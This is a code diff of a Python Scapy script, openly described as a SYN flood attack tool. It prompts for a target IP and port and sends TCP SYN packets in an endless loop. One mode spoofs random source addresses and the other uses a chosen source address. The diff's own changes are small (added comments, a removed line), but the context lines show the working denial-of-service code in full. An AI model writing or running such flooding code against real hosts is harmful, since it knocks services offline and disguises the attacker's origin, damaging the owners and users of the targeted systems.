@@ -11,7 +11,6 @@ mode = input("Y/N, would you like to run this tool in random mode?:")
 
 # Target IP and port number
 target = input("Enter the target IP address:")
-#target = ipaddress.IPv4Address(target)
 target_port = int(input("Enter the target port number:"))
 
 #  Source port and IP address
@@ -23,16 +22,17 @@ if mode == "N":
 # This function will use a random source address for the SYN flood attack
 def random_mode(target, dport, sport):
     source_address = RandIP()
+    # Making TCP packet
     packet = IP(src= source_address, dst= target)/ TCP(sport=sport, dport=dport, seq=13025, flags="S")
 
     # Sending the packet over and over again
-    num = 0
     while True:
         send(packet)
         print("Sending packets...")
 
 # SYN flood with specified source address
 def precise_mode(target, dport, sport, source_address):
+    # Making TCP packet
     packet = IP(src= source_address, dst= target)/ TCP(sport= sport, dport= dport, seq=13025, flags="S")
 
     # Sending the packet to the host
@@ -40,6 +40,7 @@ def precise_mode(target, dport, sport, source_address):
         send(packet)
         print("sending packets...")
 
+# Main function to run
 def main():
     if mode == 'Y':
         random_mode(target, target_port, source_port)
